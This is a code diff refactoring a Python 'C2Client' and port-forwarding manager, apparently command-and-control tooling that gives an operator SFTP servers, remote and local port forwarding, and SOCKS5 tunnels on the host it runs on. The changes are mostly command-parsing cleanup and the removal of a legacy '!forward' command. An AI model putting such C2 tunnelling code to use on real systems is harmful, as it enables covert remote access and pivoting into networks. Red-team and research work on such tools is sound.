@@ -24,6 +24,7 @@ logging.basicConfig(
 # Generate a host key for the SFTP server
 HOST_KEY = paramiko.RSAKey.generate(2048)
 
+
 class PortForwardingManager:
     """
     Manage port forwarding: remote-to-local, local-to-remote and dynamic (SOCKS5).
@@ -421,10 +422,6 @@ class PortForwardingManager:
         for port in dynamic_ports:
             self.stop_dynamic_forwarding(port)
             
-    # For backward compatibility
-    start_forwarding = start_remote_forwarding
-    stop_forwarding = stop_remote_forwarding
-    
     def start_remote_socks(self, remote_port: int) -> bool:
         """Start SOCKS5 proxy on a remote port"""
         def socks_handler_factory(channel):
@@ -680,15 +677,21 @@ class C2Client:
         
         # SFTP commands
         if parts[0] == '!sftp':
-            if len(parts) >= 2 and parts[1] == 'start':
-                port = int(parts[2]) if len(parts) > 2 else 3333
-                return self.sftp_service.start_sftp_server(port)
-            if len(parts) >= 2 and parts[1] == 'stop':
-                port = int(parts[2]) if len(parts) > 2 else 3333
-                return self.sftp_service.stop_sftp_server(port)
-            self.channel.send("Usage: !sftp start|stop [port]\r\n")
-            return True
+            if len(parts) < 2:
+                self.channel.send("Usage: !sftp start|stop [port]\r\n")
+                return True
+                
+            action = parts[1]
+            port = int(parts[2]) if len(parts) > 2 else 3333
             
+            if action == 'start':
+                return self.sftp_service.start_sftp_server(port)
+            elif action == 'stop':
+                return self.sftp_service.stop_sftp_server(port)
+            else:
+                self.channel.send("Unknown action. Use start or stop.\r\n")
+                return True
+                
         # Remote port forwarding commands
         if parts[0] == '!rforward':
             if len(parts) < 2:
@@ -752,8 +755,6 @@ class C2Client:
                     
                 local_port = int(parts[2])
                 return self.forwarder.start_remote_socks(local_port)
-
-                #return self.forwarder.start_dynamic_forwarding(local_port)
                 
             elif action == 'stop':
                 if len(parts) < 3:
@@ -762,8 +763,6 @@ class C2Client:
                     
                 local_port = int(parts[2])
                 return self.forwarder.stop_remote_forwarding(local_port)
-
-                #return self.forwarder.stop_dynamic_forwarding(local_port)
                 
             else:
                 self.channel.send("Unknown action. Use start or stop.\r\n")
@@ -820,7 +819,7 @@ class C2Client:
                         self.channel.send(f"  Local port {port}\r\n")
             
             # Dynamic forwarding
-            if hasattr(self.forwarder, 'dynamic_threads') and self.forwarder.dynamic_threads:
+            if self.forwarder.dynamic_threads:
                 self.channel.send("Dynamic (SOCKS5) forwarding:\r\n")
                 for port in self.forwarder.dynamic_threads:
                     if self.forwarder.dynamic_threads[port].is_alive():
@@ -834,7 +833,7 @@ class C2Client:
             
             if (not self.forwarder.remote_forward_threads and 
                 not self.forwarder.local_forward_threads and 
-                not (hasattr(self.forwarder, 'dynamic_threads') and self.forwarder.dynamic_threads) and
+                not self.forwarder.dynamic_threads and
                 not (hasattr(self, 'sftp_service') and self.sftp_service.active_ports)):
                 self.channel.send("No active forwarding\r\n")
                 
@@ -855,29 +854,7 @@ class C2Client:
             self.channel.send("!help - Show this help\r\n")
             return True
             
-        # General forwarding commands (for backward compatibility)
-        if parts[0] == '!forward':
-            if len(parts) < 3:
-                self.channel.send("Usage: !forward start|stop SERVICE PORT\r\n")
-                return True
-                
-            action = parts[1]
-            service = parts[2]
-            port = int(parts[3]) if len(parts) > 3 else 3333
-                
-            if action == 'start':
-                if service == 'sftp':
-                    return self.sftp_service.start_sftp_server(port)
-                elif service == 'socks':
-                    return self.forwarder.start_dynamic_forwarding(port)
-                else:
-                    self.channel.send(f"Unknown service: {service}\r\n")
-                    return True
-            elif action == 'stop':
-                if service == 'sftp':
-                    return self.sftp_service.stop_sftp_server(port)
-                elif service == 'socks':
-                    return self.forwarder.stop_dynamic_forwarding(port)
+        return False  # Command not processed
 
     def command_loop(self):
         while self.running:
